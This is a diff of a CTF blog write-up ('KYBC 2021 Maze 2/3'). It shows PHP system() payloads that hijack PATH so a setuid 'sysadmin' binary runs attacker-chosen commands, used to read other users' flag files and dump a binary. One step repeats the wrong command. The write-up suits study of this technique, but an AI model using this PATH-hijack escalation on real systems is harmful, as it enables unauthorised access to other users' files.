@@ -7,7 +7,7 @@
 
         <link rel="alternate"  href="https://railslide.io/feeds/all.atom.xml" type="application/atom+xml" title="Railslide Full Atom Feed"/>
 
-        <title>KYBC 2021 - Maze 2 Writeup // Railslide // Code, experiments, and thoughts</title>
+        <title>KYBC 2021 - Maze 3 Writeup // Railslide // Code, experiments, and thoughts</title>
 
 
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
@@ -52,9 +52,9 @@
         <div class="content">
             <section class="post">
                 <header class="post-header">
-                    <h1>KYBC 2021 - Maze 2 Writeup</h1>
+                    <h1>KYBC 2021 - Maze 3 Writeup</h1>
                         <p class="post-meta">
-                        category: <a href="https://railslide.io/category/ctf.html">CTF</a>, date: 22-03-2021
+                        category: <a href="https://railslide.io/category/ctf.html">CTF</a>, date: 24-03-2021
                         </p>
                         <p class="post-meta">
                             tags =                                 <a class="post-category" href="https://railslide.io/tag/ctf.html">ctf</a>
@@ -63,30 +63,36 @@
                                 <a class="post-category" href="https://railslide.io/tag/kybc.html">kybc</a>
                 </header>
             </section>
-            <p><em>In order to start this challenge it was necessary to complete <a href="https://railslide.io/kybc-yogosha-2021-maze-1-writeups.html">Maze 1</a> first</em></p>
-<p>After catching the first flag, let's check what's in <code>home/ctf_user2</code>. There is a flag file, but this time concatenating it doesn't work since the current user (<code>ctf_user1</code>) doesn't have read permissions to it. The only other interesting thing is a file called <code>sysadmin.c</code>. Permissions are in my favor this time, so let's have a look at the content:</p>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-<span class="p">{</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello sysadmin :) </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Today date : </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
-    <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">getuid</span><span class="p">());</span>
-    <span class="n">system</span><span class="p">(</span><span class="s">&quot;date&quot;</span><span class="p">);</span>
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
+            <p><em>In order to start this challenge it was necessary to complete <a href="https://railslide.io/kybc-yogosha-2021-maze-2-writeup.html">Maze 2</a> first</em></p>
+<p>Third maze, third user. Let's check what's in <code>home/ctf_user3</code></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;ls -al /home/ctf_user3&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
 </code></pre></div>
 
 
-<p>That <code>system("date")</code> call looks promising, so let's try to replace it with some useful bash statement instead:</p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;echo &quot;cat /home/ctf_user2/.52942ab6e8a6dd0bd75a9029c2b5c574_flag2.txt&quot; &gt; /tmp/date &amp;&amp; chmod 777 /tmp/date &amp;&amp; export PATH=/tmp:$PATH &amp;&amp; /home/ctf_user2/sysadmin&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
+<p>It looks like ctf_user2 owns <code>image.txt</code> and <code>RAnd0m</code>. Hovewer, neither concatenating the content of <code>image.txt</code> nor running the <code>RAnd0m</code> executable bring anything useful.</p>
+<p>Let's try to inspect the binary then with the good ol' <code>strings</code></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;echo &quot;strings /home/ctf_user3/RAnd0M&quot; &gt; /tmp/date &amp;&amp; chmod 777 /tmp/date &amp;&amp; export PATH=/tmp:$PATH &amp;&amp; /home/ctf_user2/sysadmin&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
 </code></pre></div>
 
 
-<p>Check the proc file and catch the flag - success!</p>
+<p>No luck. What about <code>od</code> then?</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;echo &quot;strings /home/ctf_user3/RAnd0M&quot; &gt; /tmp/date &amp;&amp; chmod 777 /tmp/date &amp;&amp; export PATH=/tmp:$PATH &amp;&amp; /home/ctf_user2/sysadmin&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+
+
+<p>Well that worked. Now I only need to figure out how to get out a proper hexdump from it. After a bit of digging, the <code>man</code> page comes to the rescue and provides with the syntax I need.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;echo &quot;od -A x -t x1z -v /home/ctf_user3/RAnd0M&quot; &gt; /tmp/date &amp;&amp; chmod 777 /tmp/date &amp;&amp; export PATH=/tmp:$PATH &amp;&amp; /home/ctf_user2/sysadmin&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+
+
+<p>Let's copy the hex dump into a txt file in my machine, recreate the binary and finally run <code>strings</code> on it</p>
+<div class="highlight"><pre><span></span><code><span class="err">xxd -r -p rand.txt out.bin</span>
+<span class="err">strings out.bin</span>
+</code></pre></div>
+
+
+<p>One of the strings seems to match the flag pattern <code>pvkq{dbiH._dy_pvkqH.E.H.U.H._wo_?}</code>.</p>
+<p>Running it through a <a href="http://theblob.org/rot.cgi?">ROT decoder</a> gives me <code>flag{tryX._to_flagX.U.X.K.X._me_?}</code>. Since the flag doesn't look too right and the system doesn't accept anyway, let's assume I probably messed up something while tinkering with <code>od</code> and manually fix it: <code>flag{try_to_flag_me_?}</code>.</p>
             <a href="#" class="go-top">Go Top</a>
 <footer class="footer">
     <p>&copy; Railslide <a href="http://creativecommons.org/licenses/by-sa/4.0/">(CC BY-SA 4.0)</a> &ndash;
